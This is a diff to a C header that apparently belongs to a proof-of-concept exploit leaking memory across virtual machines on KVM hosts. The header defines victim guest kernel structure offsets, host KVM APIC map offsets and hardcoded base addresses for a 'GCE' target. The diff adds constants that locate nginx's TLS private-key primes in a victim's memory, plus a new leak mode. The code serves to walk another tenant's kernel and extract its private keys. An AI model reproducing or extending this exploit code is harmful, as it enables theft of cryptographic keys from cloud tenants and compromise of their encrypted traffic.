@@ -17,22 +17,25 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
  ************************  Victim Guest Kernel Layout  ************************
  ******************************************************************************/
 
-// Offsets of globals from text.
-#define G_TEXT_INIT_TASK  0x1c112c0     // struct task_struct init_task
+#define G_TEXT_INIT_TASK	0x1c112c0	// struct task_struct init_task
 
 // struct task_struct {
-#define G_TASK_TASKS	        0x8f0	// struct list_head tasks
+#define G_TASK_TASKS		0x8f0	// struct list_head tasks
 #define G_TASK_MM		0x940	// struct mm_struct *mm
-#define G_TASK_PID	        0x9c0	// pid_t pid, tgid
+#define G_TASK_PID		0x9c0	// pid_t pid, tgid
 #define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
-#define G_TASK_COMM	        0xba8	// char comm[TASK_COMM_LEN]
+#define G_TASK_COMM		0xba8	// char comm[TASK_COMM_LEN]
 // };
-#define G_TASK_COMM_LEN	        0x10
+#define G_TASK_COMM_LEN		0x10
 
 // struct mm_struct {
 #define G_MM_PGD		0x78	// pgd_t *pgd
 #define G_MM_HEAP		0x158	// unsigned long start_brk
 // };
+
+#define NGINX_SSLKEY		0x8b9a3
+#define SSLKEY_LEN		(128 + 4 + 128) // prime1 + magic + prime2
+#define SSLKEY_MAGIC		0x00818102
 
 
 /******************************************************************************
@@ -42,7 +45,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #if MACHINE == FATHER
 
 // struct kvm_apic_map {
-#define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
+#define H_MAP_PHYS_MAP		0x218	// struct kvm_lapic *phys_map[max_apic_id+1]
 // };
 
 // struct kvm_lapic {
@@ -163,7 +166,6 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #if LEAK == SKIP
 
 #if MACHINE == FATHER
-#define BASE (hc_phys_map_base())
 #elif MACHINE == GCE
 #define BASE 0x88d43f218
 #define OWN_TASK 0xffff936a91dba000
@@ -171,7 +173,12 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define BASE 0xa1d34218
 #endif // MACHINE
 
-#endif // LEAK == SKIP
+#elif LEAK == CHEAT
+
+#define BASE (helper_base_pa())
+#define HOST_DIRECT_MAP (hc_direct_map())
+
+#endif // LEAK
 
 
 void get_feeling_for_kernel_kvm_data_structures(void);
